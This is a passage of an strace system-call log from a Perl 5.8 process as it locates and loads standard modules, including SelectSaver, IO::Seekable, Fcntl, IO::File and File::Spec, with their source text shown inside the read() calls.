> 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
6989  07:16:29.067473 read(8, "", 4096) = 0
6989  07:16:29.067490 close(8)          = 0
6989  07:16:29.067555 stat64("/etc/perl/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067572 stat64("/etc/perl/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067586 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067609 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067651 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067683 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067698 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067710 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067724 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067736 stat64("/usr/share/perl5/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067750 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067763 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067777 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.067791 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
6989  07:16:29.067813 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.067828 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.067840 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.067859 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
6989  07:16:29.067987 brk(0x81d6000)    = 0x81d6000
6989  07:16:29.068018 read(8, "", 4096) = 0
6989  07:16:29.068030 close(8)          = 0
6989  07:16:29.068396 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
6989  07:16:29.077526 read(6, "", 4096) = 0
6989  07:16:29.077542 close(6)          = 0
6989  07:16:29.077582 stat64("/etc/perl/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077597 stat64("/etc/perl/IO/Seekable.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077611 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077624 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077638 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077651 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077665 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077677 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077689 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077701 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077714 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077727 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
6989  07:16:29.077748 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.077763 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.077775 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.077793 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
6989  07:16:29.077969 stat64("/etc/perl/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077985 stat64("/etc/perl/Fcntl.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.077998 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078010 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078024 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078036 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078050 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078061 stat64("/usr/lib/perl5/Fcntl.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078074 stat64("/usr/share/perl5/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078085 stat64("/usr/share/perl5/Fcntl.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078098 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.078110 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
6989  07:16:29.078131 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.078145 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.078156 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.078175 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
6989  07:16:29.079204 brk(0x81f7000)    = 0x81f7000
6989  07:16:29.079379 read(8, "", 4096) = 0
6989  07:16:29.079394 close(8)          = 0
6989  07:16:29.079491 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6989  07:16:29.079534 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6989  07:16:29.079561 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
6989  07:16:29.079575 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
6989  07:16:29.079665 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
6989  07:16:29.079683 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d6f000
6989  07:16:29.079696 mmap2(0xb7d72000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d72000
6989  07:16:29.079711 close(8)          = 0
6989  07:16:29.079911 read(6, "", 4096) = 0
6989  07:16:29.079925 close(6)          = 0
6989  07:16:29.079957 stat64("/etc/perl/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080002 stat64("/etc/perl/IO/File.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080016 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080043 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080057 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080069 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080087 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080098 stat64("/usr/lib/perl5/IO/File.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080111 stat64("/usr/share/perl5/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080123 stat64("/usr/share/perl5/IO/File.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080136 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080148 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
6989  07:16:29.080169 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.080183 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.080194 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.080212 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
6989  07:16:29.080446 stat64("/etc/perl/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080490 stat64("/etc/perl/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080505 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080532 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080545 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080558 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080571 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080583 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080595 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080607 stat64("/usr/share/perl5/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080620 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080636 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080650 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.080662 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
6989  07:16:29.080683 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.080697 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.080708 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.080726 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
6989  07:16:29.080834 stat64("/etc/perl/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.080863 stat64("/etc/perl/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.080876 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
6989  07:16:29.080888 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf9ae4bc) = -1 ENOENT (No such file or directory)
6989  07:16:29.080901 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf9ae5ac) = -1 ENOENT (No such file or directory)
